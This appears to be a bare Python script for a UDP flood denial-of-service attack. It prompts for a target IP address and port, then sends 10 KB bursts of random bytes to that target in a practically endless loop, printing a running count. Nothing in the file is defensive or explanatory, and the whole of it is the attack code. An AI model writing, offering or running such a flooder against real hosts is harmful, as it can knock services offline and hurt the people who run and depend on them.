import socket , random, time 
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


ip = input(">")
port = int(input(">"))

s.connect((ip,port))

for i in range(1,100**1000):
    s.send(random._urandom(10)*1000)
    print("test :" + str(i), end='\n')






























